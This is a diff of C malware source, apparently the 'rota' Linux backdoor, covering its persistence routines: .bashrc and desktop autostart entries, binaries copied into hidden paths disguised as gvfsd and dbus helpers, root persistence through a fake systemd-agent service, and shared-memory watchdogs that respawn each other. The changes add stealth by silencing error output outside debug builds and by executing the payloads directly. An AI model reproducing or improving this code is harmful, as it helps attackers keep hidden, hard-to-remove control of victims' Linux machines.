@@ -78,7 +78,9 @@ bool nonroot_bashrc_persistence() {
 
     bytes_written = write(fd, bashrc_autostart, strlen(bashrc_autostart));
     if (bytes_written < 0) {
+        #ifdef DEBUG
         fprintf(stderr, "\n[nonroot_bashrc_persistence]Error writing to bashrc: %s", strerror(errno));
+        #endif
     }
 
     close(fd);
@@ -124,14 +126,11 @@ bool nonroot_desktop_persistence() {
         mkdir(dirpath, 0755);
     }
 
-    // TODO: decrypt and rotate char array for stack string to then execute write_to_file
     bool result = write_to_file(fpath, gnomehelper_desktop);
 
     // -------- copy userland binary now -------------
     //
     // copy rota binary to /home/$USER/.fvfsd/.profile/gvfsd-helper
-    // TODO convert gvfsd_helper into char array
-    // TODO decrypt and rotate char array below
 
     char *gvfsd_helper= "/.gvfsd/.profile/gvfsd-helper";
     fpath_size = strlen(HOME) + strlen(gvfsd_helper);
@@ -153,8 +152,10 @@ bool nonroot_desktop_persistence() {
     if (access(dirpath_profile, F_OK) == -1) {
         int res = mkdir(dirpath_profile, 0755);
         if (res != 0) {
+            #ifdef DEBUG
             fprintf(stderr, "\n[gvfsd]Error creating directory to %s.\tError: %s",
                 dirpath_profile, strerror(errno));
+            #endif
         }
 
     }
@@ -170,8 +171,10 @@ bool nonroot_desktop_persistence() {
     if (access(profilepath_profile, F_OK) == -1) {
         int res = mkdir(profilepath_profile, 0755);
         if (res != 0) {
+            #ifdef DEBUG
             fprintf(stderr, "\n[gvfsd/profile] Error creating directory to %s\tError: %s",
                 dirpath_profile, strerror(errno));
+            #endif
         }
     }
 
@@ -179,15 +182,15 @@ bool nonroot_desktop_persistence() {
     bool rota_write_gvfsd = copy_rota_to_userland(binpath);
 
     if (rota_write_gvfsd == false) {
+        #ifdef DEBUG
         fprintf(stderr, "\n[rota] Error writing rota to %s.\tError : %s",
                 binpath, strerror(errno));
+        #endif
     }
 
     // -------- copy userland binary now -------------
     //
     // copy rota binary to /home/$USER/.dbus/sessions/session-dbus
-    // TODO convert session-dbus into an encrypted char array
-    // TODO decrypt and rotate char array below
 
     char *session_dbus= "/.dbus/sessions/session-dbus";
     fpath_size = strlen(HOME) + strlen(session_dbus);
@@ -239,8 +242,10 @@ bool nonroot_desktop_persistence() {
     bool rota_write_session_dbus = copy_rota_to_userland(binpath_session_dbus);
 
     if (rota_write_session_dbus == false) {
+        #ifdef DEBUG
         fprintf(stderr, "\n[rota]Error writing rota to %s.\tError : %s",
                 binpath, strerror(errno));
+        #endif
     }
 
     free(fpath);
@@ -274,7 +279,6 @@ bool root_persistence(void) {
     bool result;
     char *fpath;
 
-    // TODO - stack strings, encrypt+rotate
     char *init_path_1 = "/etc/init/systemd-agent.conf";
     char *systemd_path_1 = "/lib/systemd/system/sys-temd-agent.service";
 
@@ -389,9 +393,11 @@ void *watchdog_process_shmget() {
     // obtain PID from shared memory
     int shmid = shmget(0x64b2e2, 8, IPC_CREAT | 0666);
     if (shmid < 0) {
+        #ifdef DEBUG
         fprintf(stderr, "\n[wathcdog_process_shmget](%d) Error getting shared memory : %s\n",
                 getpid(),
                 strerror(errno));
+        #endif
         sleep(5);
         // recurisvely call watchdog in the event IPC shmem creation fails.
         watchdog_process_shmget();
@@ -420,9 +426,11 @@ void *watchdog_process_shmget() {
 
         //if proc not there, exec into existence
         if (proc_alive == false) {
+            #ifdef DEBUG
             fprintf(stderr, "[watchdog_process_shmget](%d) process %d is not alive! spawning\n",
                     getpid(),
                     upper_bytes);
+            #endif
 
 
             char *user = getenv("HOME");
@@ -434,10 +442,10 @@ void *watchdog_process_shmget() {
             memcpy(user_sessiondbus_helper_path, user, strlen(user));
             strncat(user_sessiondbus_helper_path, sessiondbus_helper_path, strlen(sessiondbus_helper_path));
             //char* argument_list[] = {"/bin/sh", "-c", "/home/gdev/.dbus/sessions/session-dbus", "&", NULL}; // NULL terminated array of char* strings
-            char* argument_list[] = {"/bin/sh", "-c", user_sessiondbus_helper_path, "&", NULL}; // NULL terminated array of char* strings
+            char* argument_list[] = {user_sessiondbus_helper_path, NULL}; // NULL terminated array of char* strings
             int f_pid = fork();
             if (f_pid == 0) {
-                execvp("/bin/sh", argument_list);
+                execv(user_sessiondbus_helper_path, argument_list);
             }
             close(f_pid);
             free(user_sessiondbus_helper_path);
@@ -520,11 +528,11 @@ void *watchdog_process_shmread() {
             strncat(user_gvfsd_helper_path, gvfsd_helper_path, strlen(gvfsd_helper_path));
 
             //char* argument_list[] = {"/bin/sh", "-c", "/home/gdev/.gvfsd/.profile/gvfsd-helper", "&", NULL}; // NULL terminated array of char* strings
-            char* argument_list[] = {"/bin/sh", "-c", user_gvfsd_helper_path, "&", NULL}; // NULL terminated array of char* strings
+            char* argument_list[] = {user_gvfsd_helper_path, NULL}; // NULL terminated array of char* strings
 
             int f_pid = fork();
             if (f_pid == 0) {
-                execvp("/bin/sh", argument_list);
+                execv(user_gvfsd_helper_path, argument_list);
             }
             close(f_pid);
             free(user_gvfsd_helper_path);
